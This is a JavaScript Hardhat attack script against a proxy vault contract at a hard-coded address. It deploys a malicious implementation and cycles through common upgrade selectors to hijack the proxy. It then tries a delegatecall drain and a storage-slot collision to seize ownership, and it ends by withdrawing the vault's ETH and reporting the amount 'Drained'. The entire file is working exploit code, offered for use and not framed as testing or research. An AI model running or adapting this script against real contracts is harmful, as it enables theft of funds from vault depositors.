const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const IMPLEMENTATION_ADDRESS = "0x11fb858ee4bf594857483bcf86eb825aef1cbf91";

async function main() {
  console.log("\nðŸŽ¯ PROXY IMPLEMENTATION ATTACK");
  console.log("=====================================");
  
  const [attacker] = await ethers.getSigners();
  console.log("Attacker:", attacker.address);
  console.log("Vault (Proxy):", VAULT_ADDRESS);
  console.log("Implementation:", IMPLEMENTATION_ADDRESS);
  
  // Get gas settings
  const feeData = await ethers.provider.getFeeData();
  const gasSettings = {
    maxFeePerGas: feeData.maxFeePerGas * 2n,
    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas * 2n,
    gasLimit: 5000000
  };
  
  // Check balances
  const vaultBalanceBefore = await ethers.provider.getBalance(VAULT_ADDRESS);
  const implBalanceBefore = await ethers.provider.getBalance(IMPLEMENTATION_ADDRESS);
  console.log("\nðŸ“Š INITIAL STATE:");
  console.log("Vault balance:", ethers.formatEther(vaultBalanceBefore), "ETH");
  console.log("Implementation balance:", ethers.formatEther(implBalanceBefore), "ETH");
  
  // Analyze implementation contract
  console.log("\nðŸ” Analyzing implementation contract...");
  const implCode = await ethers.provider.getCode(IMPLEMENTATION_ADDRESS);
  console.log("Implementation code size:", implCode.length / 2 - 1, "bytes");
  
  // Check if implementation has selfdestruct
  if (implCode.includes("ff")) {
    console.log("âš ï¸  Implementation contains SELFDESTRUCT!");
  }
  
  // Deploy malicious implementation
  console.log("\nðŸš€ Deploying malicious implementation...");
  const MaliciousImpl = await ethers.getContractFactory("MaliciousImplementation");
  const malicious = await MaliciousImpl.deploy(attacker.address, gasSettings);
  await malicious.waitForDeployment();
  const maliciousAddress = await malicious.getAddress();
  console.log("Malicious implementation:", maliciousAddress);
  
  // Common proxy upgrade selectors
  const upgradeSelectors = [
    { selector: "0x3659cfe6", name: "upgradeTo(address)" },
    { selector: "0x4f1ef286", name: "upgradeToAndCall(address,bytes)" },
    { selector: "0x99a88ec4", name: "upgrade(address,address)" },
    { selector: "0xaa5e9ba5", name: "replaceImplementation(address)" },
    { selector: "0x2e17e212", name: "setImplementation(address)" },
  ];
  
  console.log("\nâš”ï¸ Attempting proxy upgrade...");
  for (const upgrade of upgradeSelectors) {
    try {
      let calldata = upgrade.selector;
      if (upgrade.name === "upgradeToAndCall(address,bytes)") {
        const drainData = malicious.interface.encodeFunctionData("drainAll");
        calldata += ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "bytes"],
          [maliciousAddress, drainData]
        ).slice(2);
      } else {
        calldata += ethers.AbiCoder.defaultAbiCoder().encode(["address"], [maliciousAddress]).slice(2);
      }
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: calldata,
        ...gasSettings
      });
      
      await tx.wait();
      console.log(`âœ… ${upgrade.name} executed!`);
      
      // Check if upgrade worked
      const newImplCall = await attacker.call({
        to: VAULT_ADDRESS,
        data: "0x60c7d295"
      });
      const newImpl = "0x" + newImplCall.slice(26, 66);
      if (newImpl.toLowerCase() === maliciousAddress.toLowerCase()) {
        console.log("ðŸŽ‰ PROXY UPGRADED TO MALICIOUS IMPLEMENTATION!");
        
        // Now drain
        const drainTx = await attacker.sendTransaction({
          to: VAULT_ADDRESS,
          data: malicious.interface.encodeFunctionData("drainAll"),
          ...gasSettings
        });
        await drainTx.wait();
        console.log("ðŸ’° Drain executed!");
      }
      break;
    } catch (e) {
      // Silent fail, try next
    }
  }
  
  // Try direct delegatecall to malicious contract
  console.log("\nðŸŽ¯ Attempting direct delegatecall drain...");
  try {
    const drainData = malicious.interface.encodeFunctionData("drainAll");
    const delegateData = "0x5b34b966" + ethers.AbiCoder.defaultAbiCoder().encode(
      ["address", "bytes"],
      [maliciousAddress, drainData]
    ).slice(2);
    
    const tx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: delegateData,
      ...gasSettings
    });
    
    await tx.wait();
    console.log("âœ… Delegatecall drain executed!");
  } catch (e) {
    console.log("âŒ Delegatecall drain failed");
  }
  
  // Try collision attack on storage slot 0 (often admin/owner)
  console.log("\nðŸ’¥ Attempting storage collision attack...");
  try {
    // Create calldata that writes to slot 0
    const CollisionPayload = await ethers.getContractFactory("StorageCollision");
    const collision = await CollisionPayload.deploy(gasSettings);
    await collision.waitForDeployment();
    
    const collisionData = collision.interface.encodeFunctionData("overwriteSlot0", [attacker.address]);
    const delegateData = "0x5b34b966" + ethers.AbiCoder.defaultAbiCoder().encode(
      ["address", "bytes"],
      [await collision.getAddress(), collisionData]
    ).slice(2);
    
    const tx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: delegateData,
      ...gasSettings
    });
    
    await tx.wait();
    console.log("âœ… Storage collision executed!");
    
    // Check if we're now admin/owner
    const ownerCall = await attacker.call({
      to: VAULT_ADDRESS,
      data: "0x8da5cb5b"
    });
    const owner = "0x" + ownerCall.slice(26);
    if (owner.toLowerCase() === attacker.address.toLowerCase()) {
      console.log("ðŸŽ‰ WE ARE NOW THE OWNER!");
      
      // Try withdraw
      for (const selector of ["0x3ccfd60b", "0x2e1a7d4d", "0xdb006a75"]) {
        try {
          const withdrawTx = await attacker.sendTransaction({
            to: VAULT_ADDRESS,
            data: selector + (selector === "0x3ccfd60b" ? "" : ethers.AbiCoder.defaultAbiCoder().encode(["uint256"], [vaultBalanceBefore]).slice(2)),
            ...gasSettings
          });
          await withdrawTx.wait();
          console.log("ðŸ’° Withdrawal executed!");
          break;
        } catch (e) {
          // Try next
        }
      }
    }
  } catch (e) {
    console.log("âŒ Storage collision failed");
  }
  
  // Final check
  const vaultBalanceAfter = await ethers.provider.getBalance(VAULT_ADDRESS);
  const attackerBalanceAfter = await ethers.provider.getBalance(attacker.address);
  const extracted = vaultBalanceBefore - vaultBalanceAfter;
  
  console.log("\nðŸ“Š FINAL RESULTS:");
  console.log("Vault balance before:", ethers.formatEther(vaultBalanceBefore), "ETH");
  console.log("Vault balance after:", ethers.formatEther(vaultBalanceAfter), "ETH");
  console.log("Extracted:", ethers.formatEther(extracted), "ETH");
  
  if (extracted > 0n) {
    console.log("\nðŸ† ATTACK SUCCESSFUL!");
    console.log("Drained", ethers.formatEther(extracted), "ETH from the vault!");
  } else {
    console.log("\nâŒ Attack failed - no funds extracted");
  }
}

main().catch((error) => {
  console.error("\nðŸ’¥ Script error:", error);
  process.exit(1);
});
